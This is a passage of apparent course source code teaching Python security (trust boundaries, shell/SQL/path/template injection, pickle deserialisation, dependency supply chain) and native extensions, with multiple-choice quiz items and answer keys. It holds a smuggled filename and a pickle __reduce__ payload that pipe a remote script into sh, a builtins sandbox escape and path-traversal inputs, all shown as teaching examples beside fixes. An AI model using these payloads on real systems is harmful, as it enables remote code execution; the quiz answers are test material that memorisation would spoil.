A trust boundary is a line that data crosses where the level of trust changes. Network diagrams hide them, because a VPC looks like one safe blob. Data flow shows them.

| Flow | Boundary crossed | What the attacker controls |
|---|---|---|
| Browser to API | internet to app | path, query, body, headers, cookies |
| API to Postgres | app to store | anything reaching the query text |
| Carrier webhook to API | internet to app, unauthenticated | the whole payload and its timing |
| Worker reading Redis | store to app | the job payload, if anything can write |
| API to S3 | app to object store | the object key, if built from input |

Row four is where teams stop looking. "It came off our own queue" is not authentication, it is an assumption about who can write to that queue.

### STRIDE, translated into Python

| Threat | What it looks like in this service |
|---|---|
| Spoofing | webhook accepted with no signature check |
| Tampering | a pickled job arriving off Redis |
| Repudiation | logs with no correlation id, so nothing joins up |
| Information disclosure | a debug traceback rendered into the browser |
| Denial of service | one backtracking regex applied to user text |
| Elevation of privilege | \`/reports/{id}\` with no ownership check |

The last row was the whole incident. The code, before:

\`\`\`python
@app.get("/reports/{report_id}")
def get_report(report_id: int, user: User = Depends(current_user)):
    return db.fetch_report(report_id)          # authenticated, never authorised
\`\`\`

And after:

\`\`\`python
@app.get("/reports/{report_id}")
def get_report(report_id: int, user: User = Depends(current_user)):
    report = db.fetch_report(report_id)
    if report is None or report.org_id != user.org_id:
        raise HTTPException(status_code=404)   # deliberately not 403
    return report
\`\`\`

The 404 is deliberate. A 403 tells the caller that report 8812 exists and belongs to somebody else, which turns the endpoint into a free customer census.

### Rank by reach, not by score

A CVSS 9.8 in a parser you never call is less urgent than a 5.3 on the one route a stranger reaches without credentials. Score each finding on two axes you can actually answer. Who can reach it: anonymous, any signed in user, an employee, or only the deploy pipeline. What do they hold afterwards: one row, one tenant, every tenant, or the host. Fix the top right corner first.

Then close the loop the way Chapter 8 closes it. Every accepted risk gets a written decision with a name against it, and every control that matters gets a test:

\`\`\`python
def test_report_from_another_org_is_not_readable(client, other_org_report):
    r = client.get(f"/reports/{other_org_report.id}", headers=auth("acme"))
    assert r.status_code == 404
\`\`\`

That test is the part of the threat model still working six months later, once the person who wrote the wiki page has left.
      `,
        [
          q('A team argues its queue worker needs no validation because jobs arrive off the company\'s own Redis. Why is that reasoning unsafe?', [
            'Redis silently drops any message above the default size limit',
            'Anything able to write to that queue now speaks with the worker\'s authority',
            'Private subnets still resolve the broker through public DNS records',
            'Redis reorders delivery, so the worker cannot trust message sequence',
          ], 1, 'A queue is a trust boundary like any other, so the real question is who can write to it, and every one of those writers inherits whatever the consuming worker is allowed to do.'),
          q('Why does the fixed report handler answer 404 rather than 403 when the record belongs to another organisation?', [
            '403 responses are excluded from the access log by default settings',
            'A 403 causes the browser to retry the request with fresh credentials',
            '404 lets the CDN cache the refusal and absorb repeated requests',
            'A 403 confirms that report id exists, which hands over free enumeration',
          ], 3, 'Distinguishing between not found and not allowed leaks the existence of other tenants\' records, so an attacker can walk the id space and count customers without ever reading one.'),
          q('A team ranks every finding purely by its CVSS score. What does that ordering miss?', [
            'Whether an unauthenticated stranger can actually reach the vulnerable code',
            'Whether the affected function has complete type annotation coverage',
            'Whether the advisory has been public for more than ninety days',
            'Whether the dependency ships wheels for the deployed platform',
          ], 0, 'A score describes a vulnerability in the abstract, while urgency depends on reachability and blast radius in your specific service, so a mid score on an anonymous route usually outranks a high score in code you never call.'),
        ]
      ),
      lesson('Injection at the Boundaries: Shell, SQL, Paths, and Templates', 13, `
An image service ran one line:

\`\`\`python
subprocess.run(f"convert {name} -resize 800x /srv/thumbs/{name}", shell=True)
\`\`\`

Someone uploaded a file named \`x.png; curl -s https://198.51.100.7/s | sh;\`. The shell did exactly what it was told. \`shell=True\` means your string is a program in another language, and the user wrote part of it.

Injection is one bug wearing four costumes. Every time, a value gets pasted into a language: shell, SQL, a filesystem path, or HTML.

### Shell: pass a list, never a string

\`\`\`python
subprocess.run(["convert", name, "-resize", "800x", dest], check=True)
\`\`\`

No shell process exists, so \`;\` and \`|\` are ordinary characters inside a filename. The gotcha nobody expects: the list form still lets an argument start with \`-\`, and a file called \`--to-command=sh\` is an option, not a name. Anchor the value with \`--\` where the tool supports it, or validate the name against a pattern first. If you genuinely need a shell, run \`shlex.quote()\` over every interpolated value and treat that as the rare case.

### SQL: placeholders bind values, and only values

\`\`\`python
cur.execute("SELECT id, total_cents FROM orders WHERE org_id = %s", (org_id,))
\`\`\`

The driver sends statement and parameters separately, so nothing inside \`org_id\` can become syntax. Then the sort feature arrives and somebody writes:

\`\`\`python
cur.execute(f"SELECT * FROM orders ORDER BY {col} {direction}")   # injectable
\`\`\`

You cannot parameterise an identifier. Table names, column names and keywords like \`ASC\` are part of the statement, not data. The fix is an allowlist, which also buys you a clean 400 for a bad column:

\`\`\`python
COLUMNS = {"created": "created_at", "total": "total_cents"}
col = COLUMNS.get(sort_key)
if col is None:
    raise HTTPException(400, "unknown sort field")
direction = "DESC" if desc else "ASC"
cur.execute(f"SELECT * FROM orders ORDER BY {col} {direction}")
\`\`\`

### Paths: the join that silently escapes

This one surprises almost everybody the first time:

\`\`\`python
>>> from pathlib import Path
>>> Path("/srv/uploads") / "invoice.pdf"
PosixPath('/srv/uploads/invoice.pdf')
>>> Path("/srv/uploads") / "/etc/shadow"
PosixPath('/etc/shadow')
\`\`\`

An absolute right hand side does not join, it replaces. Sequences of \`..\` do the same job more slowly. Resolve, then check:

\`\`\`python
base = Path("/srv/uploads").resolve()
target = (base / user_name).resolve()
if not target.is_relative_to(base):
    raise ValueError(f"path escapes upload root: {user_name}")
\`\`\`

Calling \`resolve()\` before the comparison matters because it follows symlinks. Without it, an attacker who can create \`uploads/notes\` pointing at \`/etc\` passes a plain string check and reads whatever they like.

### Templates: autoescape is off by default

Flask switches it on for \`.html\` files. A bare Jinja2 environment does not:

\`\`\`python
env = Environment()                                # autoescape=False
env = Environment(autoescape=select_autoescape())  # what you meant
\`\`\`

Worse is building the template itself out of user text. \`Template(user_input).render()\` is not cross site scripting, it is server side template injection: a Jinja expression reaches \`__class__\` and walks the object graph from there to arbitrary code. User data is an argument to a template, never part of one.

| Boundary | Dangerous | Safe |
|---|---|---|
| Shell | \`shell=True\` with an f-string | list arguments, no shell |
| SQL values | f-string inside the query | \`%s\` placeholders |
| SQL identifiers | f-string built from input | allowlist dict |
| Paths | \`base / name\` used as is | resolve plus \`is_relative_to\` |
| HTML | bare \`Environment()\` | \`select_autoescape()\` |

One rule ties the table together. Escaping is the job of whichever thing interprets the value, so it belongs at the moment of use, not at the moment of intake. Sanitising on the way in produces a database full of half escaped text that is wrong for the next output format you add, and it fails the first time somebody writes a second code path that skips the sanitiser.
      `,
        [
          q('Your code evaluates Path("/srv/uploads") / name where name arrives from a request as "/etc/shadow". What is the result?', [
            'pathlib raises ValueError because the right operand is absolute',
            'The result is /srv/uploads/etc/shadow with the leading slash stripped',
            'The result is /etc/shadow, because an absolute right side replaces the base',
            'The join succeeds, but opening the file raises PermissionError first',
          ], 2, 'The join operator treats an absolute right hand side as a fresh root rather than a component, so the base directory disappears entirely and the check you thought you had never happens.'),
          q('A dashboard sorts by a user chosen column, so the query interpolates the column name while values still use placeholders. Why is that still injectable?', [
            'Parameters bind values only, so identifiers must come from an allowlist',
            'ORDER BY is evaluated before the driver has bound any parameters',
            'The driver quotes every parameter as text, which sorts the rows wrongly',
            'Placeholders are ignored once any part of the query is an f-string',
          ], 0, 'A placeholder is sent as data alongside the statement and can never become syntax, but a column name is syntax, so the only safe way to accept one from a user is to map it through a fixed dictionary of known columns.'),
          q('A page renders a user comment through a template built from Jinja2\'s bare Environment(). What goes wrong?', [
            'Environment caches one compiled template and shares it between users',
            'Environment collapses whitespace and can break the surrounding markup',
            'Environment renders undefined names as empty strings without warning',
            'Autoescape is off by default, so markup in the comment renders live',
          ], 3, 'Only some integrations such as Flask enable escaping for you, and a bare environment defaults to autoescape=False, so any angle bracket a commenter types becomes real HTML in every visitor\'s browser.'),
        ]
      ),
      lesson('Deserialisation, Sandboxing, and Code That Arrives as Data', 13, `
Here is a complete remote code execution, and nothing in your code is buggy:

\`\`\`python
import os, pickle

class Job:
    def __reduce__(self):
        return (os.system, ("curl -s https://198.51.100.7/s | sh",))

payload = pickle.dumps(Job())     # a small blob of bytes
pickle.loads(payload)             # the shell command runs right here
\`\`\`

\`__reduce__\` tells pickle how to rebuild an object: a callable, plus arguments. \`loads\` calls it. There is no validation step to add and no safe mode to switch on, because invoking a callable named by the stream is the format working correctly.

### Where pickle hides

Celery with \`task_serializer="pickle"\`, a Redis or memcached cache, a \`.pkl\` model downloaded from a bucket, \`multiprocessing\` over a socket, and anything that ever wrote \`pickle.dump\` to disk. The question is never "is pickle safe", it is "who can write to the place I read from". If that list includes anyone outside your deploy pipeline, you have code execution as your service account.

Signing with HMAC is a real control and a partial one. It proves the payload came from something holding the key. It does nothing once an attacker reaches the signer, and it leaves you managing a key. JSON with an explicit schema costs less:

\`\`\`python
app.conf.accept_content = ["json"]     # celery: refuse pickle on the way in
app.conf.task_serializer = "json"
\`\`\`

The same trap sits across the ecosystem. \`yaml.load\` without a safe loader builds Python objects from \`!!python/object/apply\` tags, so use \`yaml.safe_load\`. PyTorch checkpoints are pickles, which is why \`torch.load\` now defaults to \`weights_only=True\`, and why anyone who turns that off is running whatever the uploader wanted.

### eval, exec, and literal_eval

\`\`\`python
config = eval(open("limits.txt").read())              # anything at all
config = ast.literal_eval(open("limits.txt").read())  # literals only
\`\`\`

\`ast.literal_eval\` parses without executing, so it cannot call anything. It is still not free: deeply nested brackets exhaust the parser, and since 3.11 converting a giant digit string raises \`ValueError\` past 4300 digits instead of burning CPU. Bound the input length before parsing it.

### You cannot sandbox Python inside Python

Every "I removed the builtins" scheme dies to the same expression:

\`\`\`python
eval("().__class__.__mro__[1].__subclasses__()", {"__builtins__": {}})
\`\`\`

That walks from an empty tuple up to \`object\` and then out to every loaded class, and somewhere in the list is something holding an import or an open file. The attribute graph is reachable from any object you hand in, and Chapter 10 showed you how deep it runs.

Real isolation is a boundary the interpreter cannot cross on its own:

| Approach | Actually stops | Cost |
|---|---|---|
| Stripped globals | nothing | false confidence |
| Child process, \`setrlimit\`, timeout | runaway CPU and memory | process overhead |
| Container, read only rootfs, no network | persistence and exfiltration | orchestration |
| gVisor or a microVM | kernel surface | ops work |
| WASM, for example Pyodide | syscalls entirely | slower, fewer libraries |

### Archives are data that writes files

\`\`\`python
with tarfile.open(upload) as tf:
    tf.extractall("/srv/incoming", filter="data")
\`\`\`

Without \`filter="data"\`, a member named \`../../etc/cron.d/backup\` writes outside the directory you named, and a symlink member redirects later writes anywhere it likes. Python 3.14 makes that filter the default. On anything older you pass it yourself, and zip archives need the same suspicion.

The habit worth building: every format that can rebuild an arbitrary object is a code format wearing a data costume. Pick a format that cannot, then validate the shape on arrival with a schema rather than trusting the parser to protect you.
      `,
        [
          q('A tiny pickle payload runs a shell command even though nothing in your code calls os.system. How?', [
            'pickle imports every module named anywhere in the stream while loading',
            'The load path evaluates any f-string that was embedded in the payload',
            'Unpickling calls __init__, and your class overrode it with side effects',
            '__reduce__ stores a callable plus arguments, and loading invokes them',
          ], 3, 'The pickle format is a small program describing how to rebuild an object, and __reduce__ lets that program name any importable callable, so loading is execution by design rather than by bug.'),
          q('A team keeps pickle but HMAC signs every payload before it enters Redis. What has that actually bought?', [
            'Complete safety, since unsigned or altered payloads are now rejected',
            'Origin proof only, so any route to the signing key is still execution',
            'Enough slowdown that brute forcing the stream becomes impractical',
            'A format change to JSON, which cannot carry a callable at all',
          ], 1, 'Signing tells you the bytes came from a holder of the key, which is useful, but it adds key management and collapses the moment an attacker reaches the signing service or the key file.'),
          q('Why does eval(code, {"__builtins__": {}}) fail as a sandbox?', [
            'The interpreter repopulates the empty mapping on the first attribute read',
            'Compilation happens before globals apply, so import statements still run',
            'Attribute access reaches __subclasses__ and rebuilds what you removed',
            'eval falls back to the calling frame\'s globals whenever the map is empty',
          ], 2, 'Any object in the expression exposes __class__, and from there the class hierarchy leads to every loaded class in the process, so the code can find something that already holds an import or an open file.'),
        ]
      ),
      lesson('The Dependency Supply Chain: Auditing, Pinning, and Typosquats', 13, `
In December 2019 two packages appeared on PyPI: \`python3-dateutil\`, and \`jeIlyfish\` spelled with a capital I where \`jellyfish\` has a lowercase L. Both harvested SSH and GPG keys. In May 2022 the maintainer account for \`ctx\`, a package doing nothing more exciting than prettier dictionaries, was taken over, and the fresh release posted environment variables, AWS credentials included, to a remote host.

Count what you actually run. A plain FastAPI service with SQLAlchemy, uvicorn and requests resolves to around forty distributions. You wrote none of them and you have read none of them.

### Install time is execution time

An sdist runs \`setup.py\` as your user, with your environment, during \`pip install\`. A wheel is unpacked. That single fact is a control you can switch on:

\`\`\`bash
pip install --only-binary=:all: -r requirements.txt
\`\`\`

Now a hijacked release has to wait until your code imports it, which at least puts it inside your runtime rather than inside your CI shell with a cloud role attached.

### Pin the tree, then pin the bytes

A version range is a policy. A lock file is the resolved tree. Hashes are the actual bytes.

\`\`\`bash
pip-compile --generate-hashes -o requirements.txt pyproject.toml
pip install --require-hashes -r requirements.txt
\`\`\`

\`\`\`text
requests==2.32.3 \\
    --hash=sha256:70761cfe03c773ceb22aa2f671b4757976145175cdfca038c02654d061d6dcc6
\`\`\`

Without hashes you are trusting that the index still serves the same artefact for that version number. With \`--require-hashes\` the install fails loudly when a single byte differs, and it forces every transitive package to be pinned as well, which is usually the moment a team finds out what it was really installing. \`uv lock\` and Poetry give the same guarantee in their own formats.

### The one flag that gets teams breached

\`\`\`bash
pip install --extra-index-url https://pypi.internal/simple acme-billing   # wrong
\`\`\`

\`--extra-index-url\` means "search both and take the highest version". Publish \`acme-billing 99.0.0\` to public PyPI and pip prefers it over your internal 1.4.2. That is dependency confusion, and it remains the easiest way into a company that names its private packages after itself. Point a single \`--index-url\` at a proxy that mirrors PyPI, so exactly one index ever answers.

### Auditing, and what to do with the noise

\`\`\`bash
pip-audit -r requirements.txt --strict
\`\`\`

Run it in CI on a schedule, not only on pull requests, because advisories land on days nobody pushed. Expect noise. A vulnerability in a code path you never call is real but not urgent, and the honest response is a dated note saying so, not a silent ignore file that outlives everyone who understood it.

| Control | What it actually stops |
|---|---|
| \`--only-binary=:all:\` | code running during install |
| \`--require-hashes\` | a swapped or rebuilt artefact |
| a single \`--index-url\` | dependency confusion |
| \`pip-audit\` in CI | known advisories, after publication |
| Trusted Publishing | a stolen token releasing as you |

That last row is about your own package. Publishing through PyPI Trusted Publishing exchanges a short lived OIDC token from CI, so no long lived API token sits in a repository secret waiting to be lifted.

One habit is worth more than any flag. Upgrade in deliberate batches rather than continuously, and read the changelog for anything that touches authentication, serialisation, or a network client. A release that quietly grows a new post install step or a new outbound host is visible in a diff and invisible in a green build.

None of this stops a maintainer you trust turning hostile tomorrow. It shortens the window, makes the change visible, and keeps one compromised machine from becoming every build you ship.
      `,
        [
          q('CI installs from PyPI with --extra-index-url aimed at your internal index. An attacker publishes acme-billing 99.0.0 to public PyPI. What happens?', [
            'pip considers both indexes and installs the highest version, which is theirs',
            'pip prefers the extra index it was given, so the internal build still wins',
            'pip refuses to resolve a name that appears on two different indexes',
            'pip warns about the clash and falls back to the previously pinned version',
          ], 0, 'The extra index flag adds a source rather than a preference, so the resolver treats both catalogues as one namespace and picks the highest version number it can see, which an attacker sets.'),
          q('Why does installing with --only-binary=:all: reduce risk at install time?', [
            'Wheels are verified against a maintainer signature published by PyPI',
            'Wheels resolve faster, so the window for a hijacked release is shorter',
            'Wheels are only unpacked, while an sdist runs setup.py as your user',
            'Wheels omit test directories, where malicious payloads usually hide',
          ], 2, 'Building a source distribution executes arbitrary Python in your shell with your environment and credentials, whereas a wheel is an archive that is extracted, so nothing runs until your own code imports it.'),
          q('A lock file pins every package to an exact version but carries no hashes. What risk remains open?', [
            'A transitive dependency can still resolve to a newer minor release',
            'The artefact served for that exact version can be replaced or rebuilt',
            'pip quietly ignores the pins whenever a matching wheel is unavailable',
            'The resolver may reorder the tree and silently drop an optional extra',
          ], 1, 'Pinning fixes the version string but you still trust whatever bytes the index hands back for it, so a compromised mirror or a re-uploaded artefact passes unnoticed until hashes are required.'),
        ]
      ),
      ],
      [
      q('A worker reads jobs from a queue any internal service can write to, unpickles them, then shells out to a converter with shell=True. Which change removes the most attacker capability first?', [
        'Add HMAC signatures to every payload placed on the job queue',
        'Rewrite the converter call using the list argument form',
        'Run the worker in a container with a read only root filesystem',
        'Switch the queue format to JSON so no callable can arrive',
      ], 3, 'Unpickling executes before any of your own code inspects the job, so the deserialisation bug is reached first and is the one that grants execution regardless of how carefully the later shell call is written.'),
      q('Which finding should a threat model rank above a high CVSS advisory in a transitive parser your code never calls?', [
        'A pinned dependency that has published no release for two years',
        'An unauthenticated endpoint joining user text into a filesystem path',
        'A logging call that records full request bodies at INFO level',
        'A test suite that fakes the database at the repository boundary',
      ], 1, 'Reachability decides urgency, and an anonymous route that lets a stranger steer a path join is directly exploitable today, while an advisory in code that never executes carries no practical risk.'),
      q('A service checks an uploaded archive path with is_relative_to, then calls tarfile.extractall on Python 3.12. Which risk survives that check?', [
        'The reader refuses members whose names begin with a leading slash',
        'extractall truncates any member name longer than one hundred characters',
        'Members can still traverse outward, because extraction is left unfiltered',
        'resolve() rejects the destination as soon as the archive adds a symlink',
      ], 2, 'The path check only validates where the archive itself lives, while each member name inside decides where a file is written, so extraction needs filter="data" on any release before that became the default.'),
      q('Which pairing of supply chain controls covers two genuinely different risks rather than the same one twice?', [
        '--require-hashes for artefact swaps, a single index for name confusion',
        'pip-audit for known CVEs, safety scanning the same advisory database',
        'Pinning exact versions, plus a lock file generated from those pins',
        'Trusted Publishing for releases, plus rotating the PyPI API token',
      ], 0, 'Hashes defend the bytes you download for a given version, while a single index removes the namespace ambiguity an attacker exploits with dependency confusion, so the two controls stop unrelated attacks.'),
      ]
    ),
    chapter(
      'Native Extensions and Life After the GIL',
      'Where pure Python runs out, and how native code and the free threaded interpreter buy real speed without leaving the language behind.',
      [
      lesson('Where Interpreter Time Goes: Bytecode, Objects, and Dynamism', 13, `
Summing ten million integers held in a list takes about 55 ms on a current laptop. The same ten million values in a \`numpy\` array sum in about 4 ms. The arithmetic is identical. What differs is how many times the interpreter had to stop and ask "what is this object, and what does plus mean for it?"

### One line of Python is a stack of runtime decisions

\`\`\`python
import dis

def add(a, b):
    return a + b

dis.dis(add)
\`\`\`

\`\`\`text
  2           RESUME                   0
  3           LOAD_FAST                a
              LOAD_FAST                b
              BINARY_OP                0 (+)
              RETURN_VALUE
\`\`\`

\`BINARY_OP\` reads like a single instruction. At runtime it loads two \`PyObject*\` pointers, inspects both types, finds the addition slot on the left type, calls through it, and allocates a fresh integer object for the result. Call it 30 to 60 nanoseconds. A C compiler turns \`a + b\` into one machine instruction that costs around a third of a nanosecond.

### Every value carries a header

| Object | \`sys.getsizeof\` |
|---|---|
| \`0\` | 28 bytes |
| \`1.5\` | 24 bytes |
| \`[]\` | 56 bytes |
| \`{}\` | 64 bytes |

An \`int\` is 28 bytes because it stores a reference count, a type pointer, a digit count, and only then the number. A list of one million distinct ints is 8 MB of pointers plus roughly 28 MB of scattered integer objects. \`array.array("q", values)\` holds the same numbers in 8 MB of contiguous memory, and that contiguity matters as much as the size: the list version chases a pointer per element and misses cache constantly, while the array version streams.

### Dynamism is the tax

\`\`\`python
total = 0
for row in rows:
    total += row.amount      # LOAD_ATTR probes the instance dict, then the type
\`\`\`

Every \`.\` is a lookup that cannot be resolved until the object arrives, because anything could have been assigned to \`row.amount\` a line earlier. Same for method calls in a loop. Hoisting the lookup out is a real, measurable win when the loop is hot:

\`\`\`python
out = []
append = out.append          # resolve once, not five million times
for row in rows:
    append(row.amount)
\`\`\`

### The interpreter fights back

Since 3.11 (PEP 659) CPython rewrites hot bytecode in place. After a function has run a few thousand times with the same types, \`BINARY_OP\` becomes \`BINARY_OP_ADD_INT\`, which skips the type dispatch entirely. You can see it:

\`\`\`python
dis.dis(add, adaptive=True)      # after warmup, the specialised form appears
\`\`\`

The specialisation carries a guard. Feed the same function ints on one call and \`Decimal\` on the next and the guard fails every time, the specialised form is torn down, and you pay the rebuild instead of gaining anything. Type stable code is not just cleaner, it is faster on the same interpreter.

### So where does native code actually pay

| Shape of work | Worth going native |
|---|---|
| 50 million float operations over one array | yes, often 20x to 100x |
| Scanning a 4 GB file byte by byte | yes |
| 200 calls of 5 microseconds each | no, the work is a rounding error |
| Waiting on Postgres or S3 | no, it is not CPU bound |

One rule decides most of these. Crossing from Python into C or Rust costs somewhere between 100 nanoseconds and a microsecond per call, spent converting arguments and building a result object. If the native function does one element of work, five million crossings eat the entire win. Move the **loop** across the boundary, not the loop body. Every fast Python library, from \`numpy\` to \`orjson\` to \`polars\`, is built on that single decision.
      `,
        [
          q('A small function that adds two ints has run 50,000 times and is fast. You change the caller so it alternates int and Decimal arguments, and the function gets measurably slower. Why?', [
            'Decimal objects are larger, so each one triggers a garbage collection pass',
            'The interpreter falls back to bytecode it recompiles on every single call',
            'The specialised opcode guards on one type pair and is torn down each time',
            'Mixed argument types force the module to be re-imported before each call',
          ], 2, 'PEP 659 rewrites BINARY_OP into a type specific form once it sees a stable pattern, so alternating types fails the guard every call and you pay for the tear down and rebuild instead of gaining from it.'),
          q('A list of one million distinct ints uses roughly 36 MB while array.array(\'q\') holds the same values in 8 MB. Where does the difference come from?', [
            'Each int is a separate heap object with a header, and the list stores pointers',
            'Lists over-allocate by a factor of four so that append stays amortised',
            'array.array compresses numeric data before it writes it into the buffer',
            'The list keeps a shadow copy of every element to make iteration faster',
          ], 0, 'The list holds eight bytes of pointer per element and each pointed-to int carries a refcount, a type pointer, and a digit count before the value, while the array stores raw eight byte integers back to back.'),
          q('A Python loop calls a C function once per element across 5 million elements, and moving the body to C gave only a 1.4x speedup. What would help most?', [
            'Compiling the extension with more aggressive optimisation flags',
            'Calling the same C function from several Python threads instead',
            'Storing the 5 million elements in a tuple rather than in a list',
            'Moving the loop itself into C so one call handles every element',
          ], 3, 'Each crossing pays argument conversion and result construction, so five million of them dominate the runtime, and a single call that iterates internally pays that boundary cost exactly once.'),
        ]
      ),
      lesson('Calling Native Code: ctypes, cffi, and the Buffer Protocol', 13, `
Here is a two line program that returns a wrong answer without crashing:

\`\`\`python
import ctypes
libm = ctypes.CDLL("libm.so.6")      # "libm.dylib" on macOS
print(libm.cos(0.0))                 # not 1.0
\`\`\`

ctypes has no header to read and no way to inspect the signature. It defaults to passing arguments as C \`int\` and reading the result as \`int\`, so the \`double\` goes in through the wrong register and the result is read from the wrong one. Declare the signature and it is correct:

\`\`\`python
libm.cos.argtypes = [ctypes.c_double]
libm.cos.restype = ctypes.c_double
print(libm.cos(0.0))                 # 1.0
\`\`\`

Set \`argtypes\` and \`restype\` on every function you touch, without exception. A missing \`restype\` on a function that returns a pointer truncates a 64 bit address to 32 bits, and the segfault surfaces hundreds of lines later inside code that is entirely innocent.

### Three ways across, and how each one fails

| Route | Needs a compiler | Signature checked by | Failure mode |
|---|---|---|---|
| ctypes | no | you, by hand | segfault at runtime |
| cffi ABI mode | no | you, by hand | segfault at runtime |
| cffi API mode | yes, at build time | the C compiler | build error |
| C API or PyO3 | yes, at build time | the compiler | build error |

cffi in API mode is the sensible default when you control the build:

\`\`\`python
# build_zstd.py
from cffi import FFI

ffi = FFI()
ffi.cdef("""
    size_t ZSTD_compressBound(size_t srcSize);
    size_t ZSTD_compress(void *dst, size_t dstCap,
                         const void *src, size_t srcSize, int level);
""")
ffi.set_source("_zstd_cffi", '#include <zstd.h>', libraries=["zstd"])
ffi.compile(verbose=True)
\`\`\`

\`set_source\` writes a real C file that includes the real header, so a typo in the \`cdef\` is a compiler error on your machine rather than memory corruption on a customer's. The price is a build step and a wheel per platform.

### Move bytes without copying them

The buffer protocol lets one object expose its raw memory to another with no copy at all. \`memoryview\` is how you reach it from Python.

\`\`\`python
buf = bytearray(1 << 20)              # one megabyte, allocated once
view = memoryview(buf)
with open("ratings.bin", "rb") as f:
    while (n := f.readinto(view)) > 0:
        handle(view[:n])              # slicing a memoryview copies nothing
\`\`\`

\`view[:n]\` is a new view over the same bytes. \`bytes(view[:n])\` is a copy. Reading a 2 GB file the first way allocates one megabyte in total. The second way allocates two gigabytes in one megabyte pieces and keeps the collector busy for the whole run. Numpy reads the same memory directly with \`np.frombuffer(view[:n], dtype=np.int32)\`.

The catch is lifetime. An exported buffer pins its owner:

\`\`\`python
data = bytearray(b"abc")
mv = memoryview(data)
data.extend(b"def")
# BufferError: Existing exports of data: object cannot be re-sized
\`\`\`

That error is the friendly case, and it exists precisely so the ugly case cannot happen. The ugly case is a C library that stored a pointer into memory Python has since freed or moved. There is no exception for that, only a crash minutes later in an unrelated thread. Keep a Python reference alive for as long as the native side holds the pointer, and release the view with \`mv.release()\` when you are done.

### One real payoff

\`ctypes.CDLL\` releases the interpreter lock around the foreign call. A 400 ms compression call issued from four threads genuinely overlaps on four cores, on a stock interpreter, with no processes forked. \`ctypes.PyDLL\` keeps the lock held, which you want only when the C code manipulates Python objects itself.
      `,
        [
          q('libm.cos(0.0) called through ctypes returns a nonsense value even though the C function is perfectly correct. What is wrong?', [
            'cos is a macro in the header, so no callable symbol exists in the library',
            'ctypes defaults to int arguments and results, so the double is mangled',
            'The library was opened with CDLL when this function requires PyDLL',
            'Float arguments must be wrapped in ctypes.byref before being passed',
          ], 1, 'Without argtypes and restype ctypes assumes C int in both directions, so the double argument travels in the wrong register and the returned double is read from the wrong one.'),
          q('Why does cffi in API mode turn a mistyped function signature into a build error while ctypes turns the same mistake into a segfault?', [
            'API mode validates each signature against a registry shipped with cffi',
            'ctypes skips its validation only when the shared library has been stripped',
            'API mode refuses to open any library that was built without debug symbols',
            'API mode compiles C that includes the real header, so the compiler checks it',
          ], 3, 'set_source generates and compiles an actual C file against the library\'s own header, so a wrong type is caught by the C compiler at build time rather than corrupting memory at runtime.'),
          q('You hand a C routine memoryview(buf) over a 200 MB bytearray, then call buf.extend(more) while that view is still alive. What happens?', [
            'extend raises BufferError, because a live export forbids resizing',
            'The bytearray is copied and the C routine keeps reading the old copy',
            'The memoryview silently widens itself to cover the newly added bytes',
            'The interpreter blocks the call until the C routine releases the view',
          ], 0, 'An exported buffer pins its owner so the underlying memory cannot move, which is what stops the native side from being left holding a pointer into a freed or reallocated block.'),
        ]
      ),
      lesson('Writing and Shipping an Extension with Rust and PyO3', 14, `
A team replaced a Python distance calculation with a Rust extension and benchmarked it at 30x slower than the code it replaced. The Rust was fine. \`maturin develop\` builds in debug mode by default, which keeps every bounds check and every overflow check and inlines nothing. Adding \`--release\` made the same code 40x faster than the Python. Check the build profile before you check anything else.

### The whole project is four files

\`\`\`text
geo/
  Cargo.toml
  pyproject.toml
  src/lib.rs
  python/geo/__init__.py
\`\`\`

\`\`\`toml
# Cargo.toml
[lib]
name = "_geo"
crate-type = ["cdylib"]

[dependencies]
pyo3 = { version = "0.24", features = ["extension-module", "abi3-py39"] }
\`\`\`

\`\`\`toml
# pyproject.toml
[build-system]
requires = ["maturin>=1.7,<2"]
build-backend = "maturin"

[project]
name = "geo"
requires-python = ">=3.9"
\`\`\`

\`crate-type = ["cdylib"]\` is what makes the output a shared library the interpreter can import. Leave it at the Rust default and the build succeeds while producing nothing importable, which is a confusing ten minutes.

### One function, and the shape that decides the result

\`\`\`rust
use pyo3::prelude::*;
use pyo3::exceptions::PyValueError;

#[pyfunction]
fn haversine_many(lats: Vec<f64>, lons: Vec<f64>, lat0: f64, lon0: f64)
    -> PyResult<Vec<f64>>
{
    if lats.len() != lons.len() {
        return Err(PyValueError::new_err("lats and lons differ in length"));
    }
    Ok(lats.iter().zip(&lons)
        .map(|(&la, &lo)| haversine(la, lo, lat0, lon0))
        .collect())
}

#[pymodule]
fn _geo(m: &Bound<'_, PyModule>) -> PyResult<()> {
    m.add_function(wrap_pyfunction!(haversine_many, m)?)?;
    Ok(())
}
\`\`\`

The signature takes whole arrays. The tempting version takes one pair of coordinates, and then a Python loop calls it two million times and gives most of the win back in argument conversion. That is the boundary rule from the first topic, applied to an API you are designing rather than one you inherited. On two million points the difference is not subtle:

| Design | Crossings | Typical time |
|---|---|---|
| \`haversine(lat, lon, ...)\` in a Python loop | 2,000,000 | about 1.9 s |
| \`haversine_many(lats, lons, ...)\` | 1 | about 0.02 s |

Returning \`PyResult\` is the other half of the design. An \`Err\` arrives in Python as a normal \`ValueError\` that a caller can catch and log. A Rust \`panic!\` arrives as \`pyo3_runtime.PanicException\`, which is catchable but tells the user nothing actionable, so validate inputs and return errors rather than unwrapping and hoping.

### Releasing the lock

\`\`\`rust
#[pyfunction]
fn score_all(py: Python<'_>, rows: Vec<f64>) -> Vec<f64> {
    py.allow_threads(|| heavy_pure_rust(rows))
}
\`\`\`

The closure inside \`allow_threads\` may not touch Python objects, and that restriction is exactly what makes it safe to let other threads run. Four Python threads calling \`score_all\` occupy four cores on a stock interpreter. Without the wrapper they queue behind each other and you have written a slower single core program.

### Shipping it

\`\`\`bash
maturin develop --release     # build and install into the active virtualenv
maturin build --release       # target/wheels/geo-0.1.0-cp39-abi3-macosx_11_0_arm64.whl
\`\`\`

Keep a thin \`python/geo/__init__.py\` in front of the compiled module rather than exposing \`_geo\` directly. It is where docstrings, argument validation, and a \`geo.pyi\` stub live, and it means you can reimplement a function in Python later without changing a single import in a caller. Ship a \`py.typed\` marker beside it so type checkers pick the stubs up.

The \`abi3-py39\` feature builds one wheel that imports on 3.9 through 3.14, so your release matrix is platforms rather than platforms multiplied by versions. Two exceptions are worth memorising: there is no stable ABI for the free threaded build, so that gets its own wheel, and a Linux wheel has to be built inside a manylinux image or pip will refuse it on other distributions. \`cibuildwheel\` in CI covers both, and always publish the sdist alongside so anyone with a Rust toolchain can build what you did not.
      `,
        [
